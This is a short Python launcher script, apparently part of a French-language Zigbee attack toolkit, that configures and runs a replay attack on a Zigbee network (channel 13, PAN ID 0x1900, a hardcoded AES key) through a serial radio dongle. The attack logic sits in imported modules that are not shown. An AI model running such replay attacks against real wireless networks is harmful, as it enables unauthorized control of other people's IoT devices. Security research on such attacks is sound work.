"""
.. include:: ../README.md
"""


from beaconSpam  import *
from CodeurTrame import *
from DecodeurTrame import *
from coordinator import *
from replay import *
from sniff import *

def main():

    attaque = ZigbeeReplayAttack(
        capture_file='captures_zigbee.json',
        channel=13,
        pan_id=0x1900,
        serial_port='/dev/ttyACM0',
        aes_key="9b9494920170aeed67e90ce7d672face"
    )
    attaque.lancer_attaque_replay(nombre_replays=3, capture_live=True)

if __name__ == "__main__":
    main()